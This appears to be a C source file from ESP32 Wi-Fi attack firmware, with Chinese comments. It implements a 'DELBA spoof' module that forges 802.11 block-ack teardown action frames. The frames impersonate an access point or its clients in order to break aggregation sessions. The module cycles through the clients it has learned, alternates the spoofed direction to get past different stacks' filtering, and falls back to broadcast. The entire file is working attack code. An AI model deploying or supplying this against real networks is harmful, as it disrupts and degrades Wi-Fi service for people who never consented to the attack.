// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// DELBA 伪造：替 AP（或替客户端）拆掉一条聚合会话。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"

#define OWNER "delba"
#define CATEGORY_BA 3
#define ACTION_DELBA 2

static bool s_active;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static uint16_t s_reason = 1;
static uint8_t s_tid;
static uint32_t s_cursor;
static uint32_t s_frames;
static uint32_t s_reverse;
static uint32_t s_blind;

static int build_delba(uint8_t *buf, size_t cap, const uint8_t da[6], const uint8_t sa[6]) {
    // 参数集：bit11 是 initiator（"我自己要拆"），bit12..15 是 TID
    uint16_t params = (uint16_t)((s_tid & 0x0F) << 12);
    params |= 0x0800;
    const uint8_t body[5] = {
        ACTION_DELBA,
        (uint8_t)(params & 0xFF),
        (uint8_t)(params >> 8),
        (uint8_t)(s_reason & 0xFF),
        (uint8_t)(s_reason >> 8),
    };
    return wf_build_action(buf, cap, da, sa, s_bssid, CATEGORY_BA, body, sizeof(body));
}

static void delba_tick(uint32_t now_ms) {
    (void)now_ms;
    if (!s_active) {
        return;
    }
    static uint8_t stas[HAL_WIFI_STA_MAX][6];
    static uint8_t frame[64];

    const size_t n = attack_sta_on_channel(s_channel, stas, HAL_WIFI_STA_MAX);
    int len;
    if (n == 0) {
        // 还没学到客户端，就先发给广播地址：大多数对端没会话会忽略，但帧格式
        // 能在空口上验一遍
        static const uint8_t kBcast[6] = WF_BROADCAST_ADDR_INIT;
        len = build_delba(frame, sizeof(frame), kBcast, s_bssid);
        if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
            s_frames++;
            s_blind++;
        }
        return;
    }

    const uint8_t *sta = stas[s_cursor % n];
    // 一半方向当作 AP 发，一半当作 STA 自己发：不同协议栈对两个方向的过滤不一样
    const bool from_ap = ((s_cursor / n) % 2) == 0;
    s_cursor++;
    len = from_ap ? build_delba(frame, sizeof(frame), sta, s_bssid)
                  : build_delba(frame, sizeof(frame), s_bssid, sta);
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (!from_ap) {
            s_reverse++;
        }
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx",
     .type = WB_T_IDX,
     .required = true,
     .min = 0,
     .max = WT_MAX_ENTRIES - 1},
    {.name = "reason", .type = WB_T_U32, .required = false, .min = 0, .max = 65535, .def = 1},
    {.name = "tid", .type = WB_T_U32, .required = false, .min = 0, .max = 15, .def = 0},
};

static esp_err_t delba_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_tid = (uint8_t)wb_args_u32(args, "tid");
    s_reason = attack_reason(wb_args_u32(args, "reason"));
    s_cursor = 0;
    s_frames = 0;
    s_reverse = 0;
    s_blind = 0;

    hal_wifi_sniffer_enable(true);
    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    s_active = true;
    attack_emit("delba", true, "ch=%u tid=%u", (unsigned)s_channel, (unsigned)s_tid);
    wb_reply_line(reply, "delba 开跑 ch=%u tid=%u reason=%u", (unsigned)s_channel,
                  (unsigned)s_tid, (unsigned)s_reason);
    return ESP_OK;
}

static void delba_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("delba", false, NULL);
}

static esp_err_t delba_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    delba_stop();
    attack_report_rate(reply, "delba", frames);
    wb_reply_line(reply, "reverse=%u blind=%u", (unsigned)s_reverse, (unsigned)s_blind);
    return ESP_OK;
}

static esp_err_t delba_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t frame[64];
    const int len = build_delba(frame, sizeof(frame), kSta, s_bssid);
    if (len <= 0) {
        wb_reply_fail(reply, "组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "len=%d cat=%u act=%u tid=%u reason=%u", len, frame[24], frame[25],
                  (unsigned)((frame[27] >> 4) & 0x0F), (unsigned)(frame[28] | (frame[29] << 8)));
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", delba_start, "idx=1..64 [reason=0..65535] [tid=0..15]", kStartPolicy, 3},
    {"stop", delba_stop_cmd, "", NULL, 0},
    {"test", delba_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "delba",
    .title = "DELBA spoof",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t delba_frames(void) {
    return s_frames;
}

static bool delba_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "delba",
    .object = &kObject,
    .stop = delba_stop,
    .tick = delba_tick,
    .frames = delba_frames,
    .active = delba_active,
};

const attack_driver_t *delba_attack(void) {
    return &kDriver;
}
